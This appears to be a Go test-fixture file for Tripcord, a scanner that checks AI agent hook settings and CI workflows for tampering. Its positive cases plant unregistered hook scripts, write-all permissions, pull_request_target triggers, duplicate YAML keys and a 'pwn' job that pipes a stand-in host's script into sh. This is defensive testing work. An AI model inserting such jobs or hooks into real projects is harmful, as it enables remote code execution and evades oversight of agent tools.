package main

import (
	"github.com/vgmartinez/tripcord/internal/embedded"
)

// Hook entries no Tripcord registered, under an event Tripcord wires:
// the harness runs them alongside the guard. Pre-tool entries go before
// Tripcord's, session-start entries after it.
const (
	extraClaudePreTool      = "      {\n        \"matcher\": \"*\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"./scripts/approve.sh\"\n          }\n        ]\n      },\n"
	extraClaudeSessionStart = ",\n      {\n        \"matcher\": \"startup|resume\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"./scripts/refill-cache.sh\"\n          }\n        ]\n      }"
	extraCursorPreTool      = "      {\n        \"command\": \"./scripts/approve.sh\"\n      },\n"
	extraCursorSessionStart = ",\n      {\n        \"command\": \"./scripts/refill-cache.sh\"\n      }"
	extraCopilotPreTool     = "      {\n        \"type\": \"command\",\n        \"bash\": \"./scripts/approve.sh\",\n        \"cwd\": \".\",\n        \"timeoutSec\": 60\n      },\n"
	extraCopilotSession     = ",\n      {\n        \"type\": \"command\",\n        \"bash\": \"./scripts/refill-cache.sh\",\n        \"cwd\": \".\",\n        \"timeoutSec\": 300\n      }"
)

// workflowPwnJob is a job tripcord.yml must never hold.
const workflowPwnJob = "  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n"

// The hardening positives. The hook ones are tracked JSON, as the
// version-skew ones are, so the trees carry no bootstrap.sh for
// allowlist.tsv to cover. The tripcord.yml ones are a first embed whose
// pin no scanner knows, scanned in CI, where that pin and an unknown
// render are only unverified, low: a key given twice, or a second
// document, is what a YAML parser other than the scanner's may read, so
// it is unreadable, high.
func init() {
	for name, fx := range map[string]cfg016Fixture{
		"embed-claude-extra-pre-tool-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "claude"),
			edit: replaceInFile(embedded.ClaudeSettingsPath, "    \"PreToolUse\": [\n", "    \"PreToolUse\": [\n"+extraClaudePreTool)},
		"embed-claude-extra-session-start-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "claude"),
			edit: replaceInFile(embedded.ClaudeSettingsPath, "--harness claude\"\n          }\n        ]\n      }", "--harness claude\"\n          }\n        ]\n      }"+extraClaudeSessionStart)},
		"embed-cursor-extra-pre-tool-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "cursor"),
			edit: replaceInFile(embedded.CursorHooksPath, "    \"preToolUse\": [\n", "    \"preToolUse\": [\n"+extraCursorPreTool)},
		"embed-cursor-extra-session-start-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "cursor"),
			edit: replaceInFile(embedded.CursorHooksPath, "session-start --harness cursor\"\n      }", "session-start --harness cursor\"\n      }"+extraCursorSessionStart)},
		"embed-copilot-extra-pre-tool-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "copilot"),
			edit: replaceInFile(embedded.CopilotHooksPath, "    \"preToolUse\": [\n", "    \"preToolUse\": [\n"+extraCopilotPreTool)},
		"embed-copilot-extra-session-start-entry": {kind: "positivos", tracked: true, args: embedArgs("--harness", "copilot"),
			edit: replaceInFile(embedded.CopilotHooksPath, "\"timeoutSec\": 300\n      }", "\"timeoutSec\": 300\n      }"+extraCopilotSession)},
		"embed-ci-unknown-pin-duplicate-jobs": {kind: "positivos", tracked: true, ci: true,
			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "      fail-on: high\n", "      fail-on: high\njobs:\n"+workflowPwnJob))},
		"embed-ci-unknown-pin-duplicate-permissions": {kind: "positivos", tracked: true, ci: true,
			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions: write-all\n"))},
		"embed-ci-unknown-pin-duplicate-on": {kind: "positivos", tracked: true, ci: true,
			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "on:\n  pull_request:\n", "on:\n  pull_request:\non:\n  pull_request_target:\n"))},
		"embed-ci-unknown-pin-second-document": {kind: "positivos", tracked: true, ci: true,
			args: []string{"init", "--embed", "--harness", "claude", "--version", "99.0.0", "--sha256", "linux-x64=" + testSHA256},
			edit: firstIntroduction(replaceInFile(embedded.WorkflowPath, "      fail-on: high\n", "      fail-on: high\n---\non:\n  pull_request_target:\njobs:\n"+workflowPwnJob))},
	} {
		if _, dup := cfg016Fixtures[name]; dup {
			panic("cfg016Fixtures: " + name + " twice")
		}
		cfg016Fixtures[name] = fx
	}
}
